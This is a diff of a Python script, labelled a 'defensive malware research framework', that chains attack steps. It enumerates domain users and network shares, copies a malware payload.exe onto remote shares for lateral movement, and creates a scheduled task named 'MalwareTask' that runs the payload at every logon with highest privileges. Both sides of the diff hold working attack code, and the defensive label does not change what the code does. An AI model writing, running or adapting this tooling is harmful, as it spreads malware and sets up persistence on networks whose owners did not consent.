@@ -1,62 +1,56 @@
 #!/usr/bin/env python3
-"""Merged modules for a defensive malware research framework."""
+"""Defensive Malware Research Framework"""
+
 import sys
 import json
 import time
-import subprocess
-import os
-import shutil
 from typing import Dict, Any
+import subprocess
+import shutil
+import os
 
 def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Command to list domain users using net command
-        command = ["net", "user", "/domain"]
+        # Command to list domain users
+        command = ['net', 'user', '/domain']
         result = subprocess.run(command, capture_output=True, text=True, timeout=10)
-        
-        # Parse the output to extract user names
+
         users = []
         if result.returncode == 0:
-            output_lines = result.stdout.splitlines()
-            for line in output_lines:
-                # Skip lines that are not part of the user list
-                if line.startswith("The command completed successfully.") or line.startswith("User accounts for"):
-                    continue
-                # Split line into user names and add to list
-                users.extend(line.split())
+            # Parse the output to extract user names
+            lines = result.stdout.splitlines()
+            for line in lines:
+                # Assuming user names are listed in lines without leading spaces
+                if line and not line.startswith(' '):
+                    users.extend(line.split())
 
         return {'success': True, 'data': {'users': users},
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'users': []},
-                'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'users': []}, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
 
 def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
     try:
-        # Command to list shared network drives
-        command = ['net', 'use']
-        result = subprocess.run(command, capture_output=True, text=True, timeout=10)
-        
-        # Parse the output to find shared network drives
+        # Use 'net view' command to list shared network drives
+        result = subprocess.run(['net', 'view'], capture_output=True, text=True, timeout=10)
         shares = []
+
         if result.returncode == 0:
+            # Parse the output to extract shared drive names
             for line in result.stdout.splitlines():
-                if line.startswith('OK'):
-                    parts = line.split()
-                    if len(parts) > 2:
-                        shares.append(parts[2])  # Assuming the share path is the third element
-        else:
-            shares = []
+                if '\\\\' in line:
+                    shares.append(line.split()[0])
 
         return {'success': True, 'data': {'shares': shares},
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
     except Exception as e:
-        return {'success': False, 'data': {'shares': []}, 'error': f'{type(e).__name__}: {e}',
+        return {'success': False, 'data': {'shares': []},
+                'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T2', 'execution_time': time.time()-start}}
 
 def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
@@ -64,22 +58,21 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     input_data = input_data or {}
     try:
         shares = input_data.get('shares', [])
-        malware_path = "C:\\path\\to\\malware.exe"  # Example malware path
+        payload_path = "C:\\path\\to\\malware\\payload.exe"  # Local path to the malware payload
+        destination_path = ""
 
-        # Attempt to copy malware to the first available share
+        # Attempt to copy the payload to the first available share
         for share in shares:
             try:
-                destination_path = os.path.join(share, os.path.basename(malware_path))
-                shutil.copy(malware_path, destination_path)
-                result = {'success': True, 'destination_path': destination_path}
-                break
+                destination_path = os.path.join(share, "payload.exe")
+                shutil.copy(payload_path, destination_path)
+                return {'success': True, 'data': {'destination_path': destination_path},
+                        'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
             except Exception as e:
-                continue
-        else:
-            # If no shares are available or copy fails, return failure
-            result = {'success': False, 'destination_path': ''}
+                continue  # Try the next share if copy fails
 
-        return {'success': result['success'], 'data': result,
+        # If no shares were successful
+        return {'success': False, 'data': {'destination_path': ''},
                 'metadata': {'task_id': 'T3', 'execution_time': time.time()-start}}
     except Exception as e:
         return {'success': False, 'error': f'{type(e).__name__}: {e}',
@@ -88,33 +81,31 @@ def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
 def task_T4(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
     start = time.time()
     input_data = input_data or {}
-    task_created = False
-    task_name = "MalwareTask"
-    
     try:
-        # Check if the previous stage was successful
-        if input_data.get('success', False):
-            destination_path = input_data.get('destination_path', '')
+        # Extract input data
+        success = input_data.get('success', False)
+        destination_path = input_data.get('destination_path', '')
+
+        # Initialize result
+        task_created = False
+
+        # Only proceed if the previous task was successful
+        if success and destination_path:
+            # Define the command to create a scheduled task
+            task_name = "MalwareTask"
+            command = f'schtasks /create /tn {task_name} /tr "{destination_path}" /sc onlogon /rl highest'
             
-            # Create a scheduled task using schtasks
-            command = [
-                "schtasks", "/create", "/tn", task_name, "/tr", destination_path,
-                "/sc", "onlogon", "/rl", "highest"
-            ]
-            subprocess.run(command, check=True, timeout=10)
+            # Execute the command to create the scheduled task
+            subprocess.run(command, shell=True, check=True, timeout=10)
             task_created = True
-        
-        result = {
-            "task_created": task_created,
-            "task_name": task_name
-        }
+
+        # Prepare the result
+        result = {'task_created': task_created}
         return {'success': True, 'data': result,
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
     except Exception as e:
-        result = {
-            "task_created": task_created,
-            "task_name": task_name
-        }
+        # Return partial result on failure
+        result = {'task_created': False}
         return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                 'metadata': {'task_id': 'T4', 'execution_time': time.time()-start}}
 
@@ -156,16 +147,16 @@ def main() -> dict:
         failed.append('T2')
         results['T2'] = {'success': False, 'error': str(e)}
     
-    # ── T3: Copy Malware to Remote Share [lateral-movement] ──
+    # ── T3: Copy Malware Payload to Remote Share [lateral-movement] ──
     try:
         r = task_T3(outputs.get('T2', {}))
         results['T3'] = r
         if r.get('success'):
             outputs['T3'] = r.get('data', {})
-            print(f'[+] T3 (Copy Malware to Remote Share): OK')
+            print(f'[+] T3 (Copy Malware Payload to Remote Share): OK')
         else:
             err = r.get('error', 'unknown')
-            print(f'[-] T3 (Copy Malware to Remote Share): FAILED — {err}')
+            print(f'[-] T3 (Copy Malware Payload to Remote Share): FAILED — {err}')
             failed.append('T3')
     except Exception as e:
         print(f'[!] T3 crashed: {e}')
